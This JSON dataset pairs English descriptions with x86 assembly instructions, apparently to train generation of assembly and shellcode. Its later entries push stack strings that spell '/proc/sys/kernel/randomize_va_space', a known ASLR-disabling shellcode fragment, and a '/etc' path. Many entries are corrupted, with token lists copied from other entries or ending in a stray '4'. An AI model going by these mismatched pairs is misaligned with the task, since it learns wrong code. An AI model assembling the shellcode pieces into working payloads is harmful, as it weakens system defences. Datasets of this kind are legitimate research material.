  },
  {
    "intent": "move 0xa4 into the byte in al",
    "rewritten_intent": "move 0xa4 into the byte in al",
    "snippet": "mov byte al, 0xa4",
    "slot_map": {
      "0xa4": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "byte",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 11 into the byte at address al",
    "rewritten_intent": "move 11 into the byte at address al",
    "snippet": "mov byte al, 11",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "11",
      "byte",
      "address",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "al",
      ",",
      "11"
    ]
  },
  {
    "intent": "move 83 into the byte at address al",
    "rewritten_intent": "move 83 into the byte at address al",
    "snippet": "mov byte al, 83",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "83",
      "byte",
      "address",
      "al"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "al",
      ",",
      "83"
    ]
  },
  {
    "intent": "move 7 into the byte at address cl",
    "rewritten_intent": "move 7 into the byte at address cl",
    "snippet": "mov byte cl, 7",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "7",
      "byte",
      "address",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "byte",
      "cl",
      ",",
      "7"
    ]
  },
  {
    "intent": "move 077o into cl",
    "rewritten_intent": "move 077o into cl",
    "snippet": "mov cl, 077o",
    "slot_map": {
      "077o": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1 into cl",
    "rewritten_intent": "move 0x1 into cl",
    "snippet": "mov cl, 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1e into cl",
    "rewritten_intent": "move 0x1e into cl",
    "snippet": "mov cl, 0x1e",
    "slot_map": {
      "0x1e": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2 into cl",
    "rewritten_intent": "move 0x2 into cl",
    "snippet": "mov cl, 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x2 into the cl register",
    "rewritten_intent": "move the value 0x2 into the cl register",
    "snippet": "mov cl, 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero",
    "rewritten_intent": "move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero",
    "snippet": "mov cl, 10 \\n dec cl \\n jnz l1",
    "slot_map": {
      "l1": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "10",
      "cl",
      "register",
      "then",
      "decrement",
      "contents",
      "cl",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "10",
      "\\n",
      "dec",
      "cl",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "move 100 into cl",
    "rewritten_intent": "move 100 into cl",
    "snippet": "mov cl, 100",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "100",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "100"
    ]
  },
  {
    "intent": "move 128 into cl",
    "rewritten_intent": "move 128 into cl",
    "snippet": "mov cl, 128",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "128",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "128"
    ]
  },
  {
    "intent": "move 13 into cl",
    "rewritten_intent": "move 13 into cl",
    "snippet": "mov cl, 13",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "13",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "13"
    ]
  },
  {
    "intent": "move 2 into cl",
    "rewritten_intent": "move 2 into cl",
    "snippet": "mov cl, 2",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "2",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "2"
    ]
  },
  {
    "intent": "move 21 into cl",
    "rewritten_intent": "move 21 into cl",
    "snippet": "mov cl, 21",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "21",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "21"
    ]
  },
  {
    "intent": "move 3 into cl",
    "rewritten_intent": "move 3 into cl",
    "snippet": "mov cl, 3",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "3",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "3"
    ]
  },
  {
    "intent": "move 30 into cl",
    "rewritten_intent": "move 30 into cl",
    "snippet": "mov cl, 30",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "30",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "30"
    ]
  },
  {
    "intent": "move 30 to the cl register",
    "rewritten_intent": "move 30 to the cl register",
    "snippet": "mov cl, 30",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "30",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "30"
    ]
  },
  {
    "intent": "move 32 into cl",
    "rewritten_intent": "move 32 into cl",
    "snippet": "mov cl, 32",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "32",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "32"
    ]
  },
  {
    "intent": "move 9 into cl",
    "rewritten_intent": "move 9 into cl",
    "snippet": "mov cl, 9",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "9",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "9"
    ]
  },
  {
    "intent": "backup al into cl",
    "rewritten_intent": "backup al into cl",
    "snippet": "mov cl, al",
    "slot_map": {},
    "intent_tokens": [
      "backup",
      "al",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "al"
    ]
  },
  {
    "intent": "move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero",
    "rewritten_intent": "move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero",
    "snippet": "mov cl, bl \\n sub cl, 1 \\n jnz loop",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "contents",
      "cl",
      "register",
      "then",
      "subtract",
      "value",
      "1",
      "cl",
      "register",
      "and",
      "jump",
      "loop",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0",
      "\\n",
      "sub",
      "cl",
      ",",
      "1",
      "\\n",
      "jnz",
      "loop"
    ]
  },
  {
    "intent": "move the byte at the address [eax] into cl",
    "rewritten_intent": "move the byte at the address [eax] into cl",
    "snippet": "mov cl, byte [eax]",
    "slot_map": {
      "eax": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "[",
      "var1",
      "]",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0",
      "\\n",
      "sub",
      "cl",
      ",",
      "1",
      "\\n",
      "jnz",
      "loop"
    ]
  },
  {
    "intent": "move the byte in esi into cl",
    "rewritten_intent": "move the byte in esi into cl",
    "snippet": "mov cl, byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the 3rd element of the byte_table into cl",
    "rewritten_intent": "move the 3rd element of the byte_table into cl",
    "snippet": "mov cl, byte_table+2",
    "slot_map": {
      "byte_table": "var0"
    },
    "intent_tokens": [
      "move",
      "3rd",
      "element",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0+2"
    ]
  },
  {
    "intent": "move shellcode_length into cl",
    "rewritten_intent": "move shellcode_length into cl",
    "snippet": "mov cl, shellcode_length",
    "slot_map": {
      "shellcode_length": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move shellcodelen into cl",
    "rewritten_intent": "move shellcodelen into cl",
    "snippet": "mov cl, shellcodelen",
    "slot_map": {
      "shellcodelen": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cl"
    ],
    "snippet_tokens": [
      "mov",
      "cl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move bx to count",
    "rewritten_intent": "move bx to count",
    "snippet": "mov count, bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "count"
    ],
    "snippet_tokens": [
      "mov",
      "count",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the esi register into the cx register",
    "rewritten_intent": "move the contents of the esi register into the cx register",
    "snippet": "mov cx, [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "cx",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "initialize cx to 01",
    "rewritten_intent": "initialize cx to 01",
    "snippet": "mov cx, 01",
    "slot_map": {},
    "intent_tokens": [
      "initialize",
      "cx",
      "01"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "01"
    ]
  },
  {
    "intent": "move 02001 into cx",
    "rewritten_intent": "move 02001 into cx",
    "snippet": "mov cx, 02001",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "02001",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "02001"
    ]
  },
  {
    "intent": "move 0666 into cx",
    "rewritten_intent": "move 0666 into cx",
    "snippet": "mov cx, 0666",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "0666",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "0666"
    ]
  },
  {
    "intent": "move 0700 into cx",
    "rewritten_intent": "move 0700 into cx",
    "snippet": "mov cx, 0700",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "0700",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "0700"
    ]
  },
  {
    "intent": "move 0x191 into cx",
    "rewritten_intent": "move 0x191 into cx",
    "snippet": "mov cx, 0x191",
    "slot_map": {
      "0x191": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1ff into cx",
    "rewritten_intent": "move 0x1ff into cx",
    "snippet": "mov cx, 0x1ff",
    "slot_map": {
      "0x1ff": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2bc into cx",
    "rewritten_intent": "move 0x2bc into cx",
    "snippet": "mov cx, 0x2bc",
    "slot_map": {
      "0x2bc": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x301 into the cx register",
    "rewritten_intent": "move the value 0x301 into the cx register",
    "snippet": "mov cx, 0x301",
    "slot_map": {
      "0x301": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "cx",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "mov the value 0x3b30 into the cx register",
    "rewritten_intent": "mov the value 0x3b30 into the cx register",
    "snippet": "mov cx, 0x3b30",
    "slot_map": {
      "0x3b30": "var1",
      "mov": "var0"
    },
    "intent_tokens": [
      "var0",
      "value",
      "var1",
      "cx",
      "register"
    ],
    "snippet_tokens": [
      "var0",
      "cx",
      ",",
      "var1"
    ]
  },
  {
    "intent": "move 0x401 into cx",
    "rewritten_intent": "move 0x401 into cx",
    "snippet": "mov cx, 0x401",
    "slot_map": {
      "0x401": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x5309 into cx",
    "rewritten_intent": "move 0x5309 into cx",
    "snippet": "mov cx, 0x5309",
    "slot_map": {
      "0x5309": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x9ed into cx",
    "rewritten_intent": "move 0x9ed into cx",
    "snippet": "mov cx, 0x9ed",
    "slot_map": {
      "0x9ed": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xfff into cx",
    "rewritten_intent": "move 0xfff into cx",
    "snippet": "mov cx, 0xfff",
    "slot_map": {
      "0xfff": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 2001 into cx",
    "rewritten_intent": "move 2001 into cx",
    "snippet": "mov cx, 2001",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "2001",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "2001"
    ]
  },
  {
    "intent": "move 2001Q into cx",
    "rewritten_intent": "move 2001Q into cx",
    "snippet": "mov cx, 2001Q",
    "slot_map": {
      "2001Q": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the 4th element of the word_table into cx",
    "rewritten_intent": "move the 4th element of the word_table into cx",
    "snippet": "mov cx, word_table + 3",
    "slot_map": {
      "word_table": "var0"
    },
    "intent_tokens": [
      "move",
      "4th",
      "element",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0",
      "+",
      "3"
    ]
  },
  {
    "intent": "move the 4th element of the array word_table into cx",
    "rewritten_intent": "move the 4th element of the array word_table into cx",
    "snippet": "mov cx, word_table[3]",
    "slot_map": {
      "word_table": "var0"
    },
    "intent_tokens": [
      "move",
      "4th",
      "element",
      "array",
      "var0",
      "cx"
    ],
    "snippet_tokens": [
      "mov",
      "cx",
      ",",
      "var0",
      "[",
      "3",
      "]"
    ]
  },
  {
    "intent": "move 0x02 into dl",
    "rewritten_intent": "move 0x02 into dl",
    "snippet": "mov dl, 0x02",
    "slot_map": {
      "0x02": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x09 into dl",
    "rewritten_intent": "move 0x09 into dl",
    "snippet": "mov dl, 0x09",
    "slot_map": {
      "0x09": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1 into dl",
    "rewritten_intent": "move 0x1 into dl",
    "snippet": "mov dl, 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x10 into dl",
    "rewritten_intent": "move 0x10 into dl",
    "snippet": "mov dl, 0x10",
    "slot_map": {
      "0x10": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x14 into dl",
    "rewritten_intent": "move 0x14 into dl",
    "snippet": "mov dl, 0x14",
    "slot_map": {
      "0x14": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1c into dl",
    "rewritten_intent": "move 0x1c into dl",
    "snippet": "mov dl, 0x1c",
    "slot_map": {
      "0x1c": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2 into dl",
    "rewritten_intent": "move 0x2 into dl",
    "snippet": "mov dl, 0x2",
    "slot_map": {
      "0x2": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x7f into dl",
    "rewritten_intent": "move 0x7f into dl",
    "snippet": "mov dl, 0x7f",
    "slot_map": {
      "0x7f": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xc into dl",
    "rewritten_intent": "move 0xc into dl",
    "snippet": "mov dl, 0xc",
    "slot_map": {
      "0xc": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xd into dl",
    "rewritten_intent": "move 0xd into dl",
    "snippet": "mov dl, 0xd",
    "slot_map": {
      "0xd": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 1+0feh into dl",
    "rewritten_intent": "move 1+0feh into dl",
    "snippet": "mov dl, 1+0feh",
    "slot_map": {
      "1+0feh": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 93 into dl",
    "rewritten_intent": "move 93 into dl",
    "snippet": "mov dl, 93",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "93",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "93"
    ]
  },
  {
    "intent": "move the byte at the address [eax + 1] into dl",
    "rewritten_intent": "move the byte at the address [eax + 1] into dl",
    "snippet": "mov dl, byte [eax + 1]",
    "slot_map": {
      "eax + 1": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "[",
      "var0",
      "]",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address [eax] into dl",
    "rewritten_intent": "move the byte at the address [eax] into dl",
    "snippet": "mov dl, byte [eax]",
    "slot_map": {
      "eax": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "[",
      "var1",
      "]",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte in eax into dl",
    "rewritten_intent": "move the byte in eax into dl",
    "snippet": "mov dl, byte [eax]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address [esi + 1] into dl",
    "rewritten_intent": "move the byte at the address [esi + 1] into dl",
    "snippet": "mov dl, byte [esi + 1]",
    "slot_map": {
      "esi + 1": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "[",
      "var1",
      "]",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the byte at the address 0ffh into dl",
    "rewritten_intent": "move the byte at the address 0ffh into dl",
    "snippet": "mov dl, byte 0ffh",
    "slot_map": {
      "0ffh": "var0"
    },
    "intent_tokens": [
      "move",
      "byte",
      "address",
      "var0",
      "dl"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "move the contents stored at the address len into the dl register",
    "rewritten_intent": "move the contents stored at the address len into the dl register",
    "snippet": "mov dl, len",
    "slot_map": {
      "len": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "stored",
      "address",
      "var0",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "dl",
      ",",
      "var0"
    ]
  },
  {
    "intent": "copy the value in var1 into the doubleword starting at the address in eax",
    "rewritten_intent": "copy the value in var1 into the doubleword starting at the address in eax",
    "snippet": "mov dword [eax], var1",
    "slot_map": {
      "var1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "copy",
      "value",
      "var0",
      "doubleword",
      "starting",
      "address",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx",
    "rewritten_intent": "move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx",
    "snippet": "mov dword [ebx], 2",
    "slot_map": {
      "32-bit": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "integer",
      "representation",
      "2",
      "doubleword",
      "starting",
      "address",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "2"
    ]
  },
  {
    "intent": "move the 32-bit integer representation of 4 into the doubleword starting at address ebx",
    "rewritten_intent": "move the 32-bit integer representation of 4 into the doubleword starting at address ebx",
    "snippet": "mov dword [ebx], 4",
    "slot_map": {
      "32-bit": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "integer",
      "representation",
      "4",
      "doubleword",
      "starting",
      "address",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move eax into the dword at address [esi + 12]",
    "rewritten_intent": "move eax into the dword at address [esi + 12]",
    "snippet": "mov dword [esi + 12], eax",
    "slot_map": {
      "esi + 12": "var2",
      "eax": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dword",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move ebx into the dword at address [esi + 8]",
    "rewritten_intent": "move ebx into the dword at address [esi + 8]",
    "snippet": "mov dword [esi + 8], ebx",
    "slot_map": {
      "esi + 8": "var2",
      "ebx": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dword",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x5f657a69 into the double word starting at the address [esp-0x10]",
    "rewritten_intent": "move the value 0x5f657a69 into the double word starting at the address [esp-0x10]",
    "snippet": "mov dword [esp-0x10], 0x5f657a69",
    "slot_map": {
      "esp-0x10": "var3",
      "0x5f657a69": "var0",
      "[": "var2",
      "]": "var4"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x6d6f646e into the double word starting at the address [esp-0x14]",
    "rewritten_intent": "move the value 0x6d6f646e into the double word starting at the address [esp-0x14]",
    "snippet": "mov dword [esp-0x14], 0x6d6f646e",
    "slot_map": {
      "esp-0x14": "var3",
      "0x6d6f646e": "var0",
      "[": "var2"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x61722f6c into the double word starting at the address [esp-0x18]",
    "rewritten_intent": "move the value 0x61722f6c into the double word starting at the address [esp-0x18]",
    "snippet": "mov dword [esp-0x18], 0x61722f6c",
    "slot_map": {
      "esp-0x18": "var2",
      "0x61722f6c": "var0",
      "[": "var1",
      "]": "var3"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x656e7265 into the double word starting at the address [esp-0x1c]",
    "rewritten_intent": "move the value 0x656e7265 into the double word starting at the address [esp-0x1c]",
    "snippet": "mov dword [esp-0x1c], 0x656e7265",
    "slot_map": {
      "esp-0x1c": "var2",
      "0x656e7265": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]",
    "rewritten_intent": "move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]",
    "snippet": "mov dword [esp-0x20], 0x6b2f7379",
    "slot_map": {
      "esp-0x20": "var3",
      "0x6b2f7379": "var0",
      "[": "var2",
      "]": "var4"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x732f636f into the double word starting at the address [esp-0x24]",
    "rewritten_intent": "move the value 0x732f636f into the double word starting at the address [esp-0x24]",
    "snippet": "mov dword [esp-0x24], 0x732f636f",
    "slot_map": {
      "esp-0x24": "var2",
      "0x732f636f": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x72702f2f into the double word starting at the address [esp-0x28]",
    "rewritten_intent": "move the value 0x72702f2f into the double word starting at the address [esp-0x28]",
    "snippet": "mov dword [esp-0x28], 0x72702f2f",
    "slot_map": {
      "esp-0x28": "var2",
      "0x72702f2f": "var0",
      "[": "var1",
      "]": "var3"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the contents of the eax into the double word starting at the address [esp-0x4]",
    "rewritten_intent": "move the contents of the eax into the double word starting at the address [esp-0x4]",
    "snippet": "mov dword [esp-0x4], eax",
    "slot_map": {
      "esp-0x4": "var2",
      "eax": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x65636170 into the double word starting at the address [esp-0x8]",
    "rewritten_intent": "move the value 0x65636170 into the double word starting at the address [esp-0x8]",
    "snippet": "mov dword [esp-0x8], 0x65636170",
    "slot_map": {
      "esp-0x8": "var3",
      "0x65636170": "var0",
      "[": "var2"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move the value 0x735f6176 into the double word starting at the address [esp-0xc]",
    "rewritten_intent": "move the value 0x735f6176 into the double word starting at the address [esp-0xc]",
    "snippet": "mov dword [esp-0xc], 0x735f6176",
    "slot_map": {
      "esp-0xc": "var3",
      "0x735f6176": "var0",
      "[": "var2"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "double",
      "word",
      "starting",
      "address",
      "[",
      "var3",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move 0x6374652f into the dword at address [esp-12]",
    "rewritten_intent": "move 0x6374652f into the dword at address [esp-12]",
